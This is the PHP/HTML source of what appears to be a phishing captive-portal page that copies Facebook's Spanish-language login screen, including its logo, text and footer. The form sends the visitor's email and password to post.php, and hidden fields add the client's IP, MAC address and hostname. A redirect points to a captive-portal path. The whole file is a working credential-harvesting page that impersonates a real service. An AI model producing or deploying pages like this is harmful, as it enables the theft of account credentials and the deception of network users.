<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="./assets/css/styles.css" />
        <link
            rel="shortcut icon"
            href="./assets/img/fm5arwc28y.png"
            type="image/x-icon"
        />
        <title>Facebook - Entrar o Registrarse</title>
    </head>
    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
    function redirect() {
        setTimeout(function() {
        window.location = "/captiveportal/index.php";
        }, 100);
    }
    </script>
    <body>
        <section class="hero">
            <div class="text">
                <img
                    src="https://logos-marcas.com/wp-content/uploads/2020/04/Facebook-Logo-650x366.png"
                />
                <h3>
                Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
                </h3>
            </div>

            <div class="signup">
                <form method="POST" action="post.php">
                    <input type="email" name="email_facebook"  placeholder="Correo electrónico o número de teléfono" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                    <input type="password" name="password_facebook"  placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                    <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                    <input type="hidden" name="target" value="https://m.facebook.com">
                    <button class="login-btn" type="submit">Entrar</button>
                    <a class="forgot-pass" href="#">¿Has olvidado la contraseña?</a>
                    <hr>
                    <button class="create-btn" type="submit">Crear cuenta nueva</button>  
                </form>
                <a class="createpage" href="#">Crea una página </a
                ><span> para un famoso, una marca o una empresa.</span>
            </div>
        </section>

        <footer>
            <div class="langs">
                <a>English(US)</a>
                <a href="#">العربية</a>
                <a href="#">Filipino</a>
                <a href="#">اردو</a>
                <a href="#">Bahasa Indonesia</a>
                <a href="#">हिन्दी</a>
                <a href="#">বাংলা</a>
                <a href="#">नेपाली</a>
                <a href="#">മലയാളം</a>
                <a href="#">Español</a>
                <a href="#">Português (Brasil)</a>
                <button class="more-lang">
                    <svg viewBox="0 0 448 512" width="100" title="plus">
                        <path
                            d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"
                        />
                    </svg>
                </button>
            </div>
            <hr />
            <div class="sitelinks">
                <a href="#">Sign Up</a>
                <a href="#">Log In</a>
                <a href="#">Messenger</a>
                <a href="#">Facebook Lite</a>
                <a href="#">Watch</a>
                <a href="#">Places</a>
                <a href="#">Games</a>
                <a href="#">Marketplace</a>
                <a href="#">Facebook Pay</a>
                <a href="#">Oculus</a>
                <a href="#">Portal</a>
                <a href="#">Instagram</a>
                <a href="#">Bulletin</a>
                <a href="#">Local</a>
                <a href="#">Fundraisers</a>
                <a href="#">Services</a>
                <a href="#">Voting Information Center</a>
                <a href="#">Groups</a>
                <a href="#">About</a>
                <a href="#">Create Ad</a>
                <a href="#">Create Page</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
                <a href="#">Privacy</a>
                <a href="#">Cookies</a>
                <a href="#">Ad choices</a>
                <a href="#">Terms</a>
                <a href="#">Help</a>
            </div>

            <div class="copyright">Meta &copy; 2022</div>
        </footer>
    </body>
</html>
